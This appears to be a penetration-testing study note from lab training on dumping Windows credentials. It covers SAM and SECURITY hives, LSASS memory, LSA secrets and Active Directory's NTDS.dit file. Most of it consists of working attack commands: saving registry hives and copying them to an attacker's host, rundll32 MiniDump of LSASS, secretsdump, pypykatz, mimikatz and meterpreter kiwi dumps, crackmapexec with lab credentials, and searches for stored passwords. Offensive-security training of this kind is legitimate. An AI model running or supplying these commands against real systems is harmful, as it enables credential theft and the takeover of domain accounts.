- **tags:** #credentials #SAM #secrets
- ------------------
# Dumping Hashes from SAM
Targeted registries:
- *hklm\\sam*: Contains the hashes associated with local account passwords.
- *hklm\\system*: Contains the system bootkey, which is used to encrypt the SAM database.
- *hklm\\security*: Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
Only administrators or user with **SeBackupPrivilege** can do the following:

```shell
reg save HKLM\sam sam.backup
reg save HKLM\system system.backup
reg save HKLM\security security.backup

copy sam.backup \\<atackers IP>\foldername\sam
copy system.backup \\<atackers IP>\foldername\system

impacket-secretsdump -sam sam -system system -security security LOCAL
```
*secretsdump* cannot dump the SAM hashes without the boot key (found inside the System Hive) because that boot key is used to encrypt & decrypt the SAM database.
# LSA Secrets
In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting *LSASS*. The Local Security Authority Sub-System is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.
Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
## Dumping LSASS Process Memory
Our goal now is to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract cached credentials offline using our attack host.
### lsass.DMP via Task Manager
With access to an interactive graphical session with the target, we can use task manager to create a memory dump. Steps:
- *Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file*
### lsass.DMP Rundll32.exe & Comsvcs.dll Method
Grab the *lsass.exe PID*.
```shell
# via CMD
tasklist /svc | find "lsass"
# Via Powershell
Get-Process -name lsass
```
With an elevated PowerShell session, we can issue the following command to create the dump file:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).
### Dumping Secrets Using CrackMapExec
Alternatively we can attempt to dump the LSA secrets remotely (using an account with access to local privileges) using *crackmapexec*.
```shell
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
## Dumping LSA secrets with pypykatz
LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. *Pypykatz is an implementation of Mimikatz written entirely in Python*. The fact that it is written in Python allows us to run it on Linux-based attack hosts.
```bash
pypykatz lsa minidump lsass.dmp
```
Output sections:
- **MSV**: authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.
- **WDIGEST**: older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. (clear-text credentials)
- **Kerberos**: LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos.
- **DPAPI**: Data Protection Application Programming Interface is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications.
## Dumping Credentials with Mimikatz or Kiwi
The *SAM* (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords. *Mimikatz* can be used to extract hashes from the *lsass.exe* (Local Security Authority SubSystem) process memory where hashes are cached. Alternatively, if we have access to a *meterpreter* session on a Windows target, we can utilize the inbuilt *meterpreter* extension *Kiwi*.
**Note:** Mimikatz will require elevated privileges in order to run correctly.
**Note:** In the INE labs Mimikatz is found in `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
## PoC
In a *meterpreter* session:
```bash
pgrep lsass
migrate <lsass number>
load kiwi
creds_all #dump administrator NTLM hash
lsa_dump_all #dumps all user NTLM hashes, SySKey, SAMKey
```
With *mimikatz*
```exe
privilege::debug #check if we have the required privileges
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords #will display the passwords of the logon users if they are cached in cleartext
```
### Walkthroughs:
- [[dumpingCredsWithKiwi.pdf]]
# Active Directory NTDS.dit FILE
*NTDS.dit* is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain.
## Manual Approach
Steps:
- Check if current user belongs to the *local admin* (`Administrators group`) or *Domain Admin* (`Domain Admins group`) (or equivalent) rights.
- Create a Shadow Copy of the C:\ drive.
```powershell
vssadmin CREATE SHADOW /For=C:
```
- Copy *ntds.dit* file from the shadow copy
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
## Using CrackMapExec
Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command.
```bash
crackmapexec smb 10.129.20.84 -u jmarston -p 'P@ssword!' --ntds
```
# Credential Hunting
- For finding specific files we can use *where*:
```shell
where /r C:\ *pass*
```
- For finding specific strings inside files:
```shell
cd C:\
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
- Use password gathering tools like [lazagne.exe](https://github.com/AlessandroZ/LaZagne)
- Unattended windows installation files (`C:\\Windows\Panther\Unattend.xml`,  `C:\Windows\Panther\Autounattend.xml`) passwords encoded in *base64*.